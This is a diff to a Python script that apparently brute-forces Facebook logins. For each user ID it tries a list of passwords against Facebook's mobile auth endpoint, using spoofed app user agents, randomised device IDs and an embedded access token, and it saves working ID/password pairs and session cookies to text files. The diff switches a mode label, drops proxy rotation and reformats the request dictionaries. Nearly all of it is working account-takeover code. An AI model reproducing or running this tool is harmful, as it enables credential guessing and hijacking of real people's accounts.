@@ -1297,7 +1297,7 @@ def mbasic(uid,pwx,tl):
     global loop
     global oks
     global cps
-    sys.stdout.write(f"\r {green}(M1) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
+    sys.stdout.write(f"\r {green}(M2) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
@@ -1328,53 +1328,49 @@ def mbasic(uid,pwx,tl):
             "[FBAN/FB4A;FBAV/355.0.0.44.118;FBBV/300182893;FBDM/{density=4.0,width=1080,height=2280};FBLC/ko_KR;FBRV/305000123;FBCR/SKT;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-G970N;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
             "[FBAN/FB4A;FBAV/365.0.0.44.118;FBBV/310204222;FBDM/{density=3.0,width=1080,height=2400};FBLC/ru_RU;FBRV/315309999;FBCR/MegaFon;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/Realme 7 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:]"]
             random_user_agent = random.choice(user_agents)
-            nip=random.choice(xvx)
-            proxs= {'http': nip}
             data = {
-                'adid': str(uuid.uuid4()),
-                'format': 'json',
-                'device_id': str(uuid.uuid4()),
-                'email': uid,
-                'password': pw,
-                'generate_analytics_claims': '1',
-                'community_id': '',
-                'cpl': 'true',
-                'try_num': '1',
-                'family_device_id': str(uuid.uuid4()),
-                'credentials_type': 'password',
-                'source': 'login',
-                'error_detail_type': 'button_with_disabled',
-                'enroll_misauth': 'false',
-                'generate_session_cookies': '1',
-                'generate_machine_id': '1',
-                'currently_logged_in_userid': '0',
-                'locale': 'en_GB',
-                'client_country_code': 'GB',
-                'fb_api_req_friendly_name': 'authenticate',
-                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
-                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            }
+            'adid': str(uuid.uuid4()),
+            'format': 'json',
+            'device_id': str(uuid.uuid4()),
+            'email': uid,
+            'password': pw,
+            'generate_analytics_claims': '1',
+            'community_id': '',
+            'cpl': 'true',
+            'try_num': '1',
+            'family_device_id': str(uuid.uuid4()),
+            'credentials_type': 'password',
+            'source': 'login',
+            'error_detail_type': 'button_with_disabled',
+            'enroll_misauth': 'false',
+            'generate_session_cookies': '1',
+            'generate_machine_id': '1',
+            'currently_logged_in_userid': '0',
+            'locale': 'en_GB',
+            'client_country_code': 'GB',
+            'fb_api_req_friendly_name': 'authenticate',
+            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+            'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
+            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',}
             headers = {
-                'User-Agent': ua_api(),
-                'Accept-Encoding': 'gzip, deflate',
-                'Connection': 'close',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'X-FB-Net-HNI': str(random.randint(20000,40000)),
-                'X-FB-SIM-HNI': str(random.randint(20000,40000)),
-                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                'X-FB-Connection-Type': 'WIFI',
-                'X-FB-device-group': str(random.randint(2000, 4000)),
-                'X-Tigon-Is-Retry': 'False',
-                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'x-fb-device-group': '5120',
-                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                'X-FB-Request-Analytics-Tags': 'graphservice',
-                'X-FB-HTTP-Engine': 'Liger',
-                'X-FB-Client-IP': 'True',
-                'X-FB-Server-Cluster': 'True',
-                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
-            }
+            'User-Agent': UBI_(),
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'close',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Host': 'graph.facebook.com',
+            'X-FB-Net-HNI': str(random.randint(20000,40000)),
+            'X-FB-SIM-HNI': str(random.randint(20000,40000)),
+            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'X-FB-Connection-Type': 'WIFI',
+            'X-Tigon-Is-Retry': 'False',
+            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
+            'X-FB-device-group': str(random.randint(2000, 4000)),
+            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+            'X-FB-Request-Analytics-Tags': 'graphservice',
+            'X-FB-HTTP-Engine': 'Liger',
+            'X-FB-Client-IP': 'True',
+            'X-FB-Server-Cluster': 'True',
+            'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',}
             url = "https://b-api.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
@@ -1389,12 +1385,10 @@ def mbasic(uid,pwx,tl):
                 if "live" in c:
                     if result["is_account_confirmed"] == False:
                         print(f" {green}[ATOM-OK] {uid}|{pw}")
-                        #print(f" {green}[user_agent] {green}{random_user_agent}")
                        #print(f" {green}[COOKIES] {green}{coki}")
                         open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     else:
                         print(f" {green}[ATOM-OK] {uid}|{pw}")
-                        #print(f" {green}[user_agent] {green}{random_user_agent}")
                        #print(f" {green}[COOKIES] {green}{coki}")
                         open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                         oks.append(uid)
